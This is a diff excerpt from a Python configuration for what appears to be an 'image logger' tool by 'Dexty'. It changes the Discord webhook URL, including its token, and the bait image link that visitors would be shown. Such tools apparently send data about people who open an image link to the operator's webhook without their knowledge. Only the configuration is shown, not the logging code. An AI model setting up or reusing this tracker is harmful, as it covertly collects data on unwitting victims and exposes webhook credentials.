@@ -12,8 +12,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1405032180555714691/sQeQR5r9Hq8ckO5qxJmT-__07iG2itB8Jg_dFoesWDfoNCxIgjipribuCXl8y9qcolmG",
-    "image": "https://tenor.com/view/smoke-cigarettes-khalifa-gif-14617129", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1405032182644346952/l7fpYP0oReBl6QJS-NWckgnwPC3QVI6Fo2Ve3vUcc2zVcGcM5l-UW_2HniXT6BzuuRmD",
+    "image": "https://i.ytimg.com/vi/MqtZtBlWv2o/maxresdefault.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
